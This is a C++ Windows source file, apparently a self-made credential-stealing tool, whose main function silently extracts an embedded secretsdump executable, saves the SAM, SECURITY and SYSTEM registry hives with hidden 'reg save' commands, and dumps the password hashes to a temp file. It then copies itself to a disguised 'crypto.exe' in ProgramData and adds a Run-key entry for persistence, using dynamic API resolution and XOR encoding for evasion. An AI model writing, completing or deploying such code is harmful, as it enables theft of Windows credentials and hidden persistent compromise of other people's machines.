// main.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <cstdlib>
#include <string>
#include <tchar.h>
#include "resource.h"
#include <fstream>
#include <atlstr.h>

using namespace std;

//Depending on the call type you can use _stdcall or _cdecl


//Define messageboxA typedef
typedef int(_stdcall* Msg) (HWND, LPCSTR, LPCSTR, UINT);
//Define ShellExecuteA typedef
typedef HINSTANCE(_stdcall* Shell) (HWND,LPCSTR,LPCSTR,LPCSTR,LPCSTR,INT);
//Define GetModuleFileNameA
typedef DWORD (_stdcall* ModuleFile)(HMODULE,LPSTR,DWORD );
//Define CopyFile
typedef BOOL (_stdcall* Copying)(LPCTSTR,LPCTSTR,BOOL);


HINSTANCE LLibrary(LPCWSTR dllToLoad);
void DumpSam();
string XorEncoding(string input, char cipher);
void CopyExe();
void AddToRegistry(LPCTSTR data);
void ExtractResource();
string ReturnTempPath(string name);
BOOL ExecuteDump();


int main(int argc, char* argv[])
{ 


	ExtractResource();
	DumpSam();
	ExecuteDump();
	CopyExe();



	
    cout << "\nHello World!\n";

	//Get handle to user32.dll
	HINSTANCE hDll = LLibrary(TEXT("User32.dll"));

	printf("Lib Loaded\n");
	Msg MsgBox = (Msg)GetProcAddress(hDll, "MessageBoxA");
	MsgBox(NULL, "Test", "test", 0);

	//Release the library
	FreeLibrary(hDll);
	
	return 0;
	
}

//Function to dump the three registries to file; sam, security and system
void DumpSam() {
	//Load shell32.dll
	HINSTANCE shellDll = LLibrary(TEXT("Shell32.dll"));
	Shell ShellExec = (Shell)GetProcAddress(shellDll, "ShellExecuteA");


	//Save the sam registry
	HINSTANCE samReg = ShellExec(NULL, "open", "cmd.exe", "/C reg save hklm\\sam %TEMP%\\sam.save ", NULL, SW_HIDE);

	//Check if value returned is greater than 32
	if (!((int)samReg >32)) {
		printf("Error dumping sam reg");
	}

	//Save the security registry
	HINSTANCE securityReg = ShellExec(NULL, "open", "cmd.exe", "/C reg save hklm\\security  %TEMP%\\security.save ", NULL, SW_HIDE);

	if (!((int)securityReg > 32)) {
		printf("Error dumping security reg");
	}

	//Save the system registry
	HINSTANCE systemReg = ShellExec(NULL, "open", "cmd.exe", "/C reg save hklm\\system %TEMP%\\system.save ", NULL, SW_HIDE);

	if (!((int)systemReg > 32)) {
		printf("Error dumping system reg");
	}
}

//Function to load library
HINSTANCE LLibrary(LPCWSTR dllToLoad) {
	HINSTANCE hDll = LoadLibrary(dllToLoad);

	if (hDll == NULL) {
		wprintf(L"Error getting handle to: %s",dllToLoad);
		exit(1);
	}
	
	return hDll;
}

//Function to encode/decode text
string XorEncoding(string input, char cipher) {

	for (int i = 0; i < input.size(); i++)
	{
		input[i] = input[i] ^ cipher;
	}

	return input;
}

//Function to copy the current exe to Crypto folder
void CopyExe() {
	HINSTANCE kernelDll = LLibrary(TEXT("Kernel32.dll"));
	ModuleFile ModuleFileName = (ModuleFile)GetProcAddress(kernelDll, "GetModuleFileNameA");
	Copying CopyingFile = (Copying)GetProcAddress(kernelDll, "CopyFile");

	//TODO: Use GetProcAddress functions to call the functions

	wchar_t charArray[MAX_PATH];
	//Get the full path from the handle
	GetModuleFileName(NULL, charArray, MAX_PATH);
	//Copy the current exe to the Crypto folder, and overwrite if one exists
	LPCTSTR path = L"C:\\ProgramData\\Microsoft\\Crypto\\crypto.exe";
	CopyFile(charArray,path, FALSE);

	//Once the file is copied add the exe to registry
	AddToRegistry(path);

}

void AddToRegistry(LPCTSTR data)
{
	HKEY hKey;

	LPCTSTR value = L"crypto";
	
	//Open the CurrentVersion\Run key 
	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
		//Write the value and data to the opened key
		LSTATUS ret=RegSetValueEx(hKey, L"crypto", 0, REG_SZ, (LPBYTE)data, _tcslen(data) *sizeof(TCHAR));
		if (ret==ERROR_SUCCESS)
		{
			printf("Good adding");

		}
		else {
			printf("Error adding");
		}
		RegCloseKey(hKey);
	}
	else {
		printf("error opening");
	}
}

void ExtractResource() {

	//Get the handle to the current process
	HMODULE hModule = GetModuleHandle(NULL);
	//Find the secretdump.exe resource
	HRSRC ret = FindResource(hModule, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	//Load the resource
	HGLOBAL res = LoadResource(hModule, ret);
	//Get lock to resource
	LPVOID lock = LockResource(res);
	//Get the size of the exe
	DWORD size = SizeofResource(hModule, ret);

	string path = ReturnTempPath("dump.exe");

	//Open output stream to file
	std::ofstream outputFile(path.c_str(), std::ios::binary);
	//Write the resource file 
	outputFile.write((const char*)lock, size);
	//Close the dile
	outputFile.close();
}


//Function that will append the temp dir with the given filename
string ReturnTempPath(string name) {
	//Get the temp path for the computer
	CHAR czTempPath[MAX_PATH] = { 0 };
	GetTempPathA(MAX_PATH, czTempPath); // retrieving temp path

	string path = czTempPath;
	//The name of the new exe
	path += name;


	return path;
}


//Function that will execute the dump.exe(secretsdump.exe)
BOOL ExecuteDump() {

	//Get the path relative to temp directory
	string exePath = ReturnTempPath("dump.exe");
	string samPath = ReturnTempPath("sam.save");
	string securityPath = ReturnTempPath("security.save");
	string systemPath = ReturnTempPath("system.save");
	string filePath = ReturnTempPath("hash.txt");
	string finalPath = exePath + " -sam " + samPath + " -security " + securityPath + " -system " + systemPath + " LOCAL ";
	
	//Convert file and final path from string to tchar
	TCHAR sFilePath[MAX_PATH];
	_tcscpy_s(sFilePath, CA2T(filePath.c_str()));

	TCHAR sFinalPath[MAX_PATH];
	_tcscpy_s(sFinalPath, CA2T(finalPath.c_str()));

	//Initialise security attributes
	SECURITY_ATTRIBUTES sa;
	sa.nLength = MAX_PATH;
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;


	//Create a file and get handle
	HANDLE hFile = CreateFile(sFilePath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, &sa, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Initialise variables
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	BOOL ret = FALSE;
	DWORD flags = CREATE_NO_WINDOW;

	// Write the blocks of memory to zero
	SecureZeroMemory(&pi, sizeof(pi));
	SecureZeroMemory(&si, sizeof(si));

	//Initialise the startupinfo struct
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags |= STARTF_USESTDHANDLES;
	si.hStdInput = NULL;
	si.hStdOutput = hFile;
	si.hStdError = hFile;

	//Create(run) the process
	ret = CreateProcess(NULL, sFinalPath, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi);

	//If success, quit the process after exit
	if (ret) {
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return 0;
	}
	return -1;
}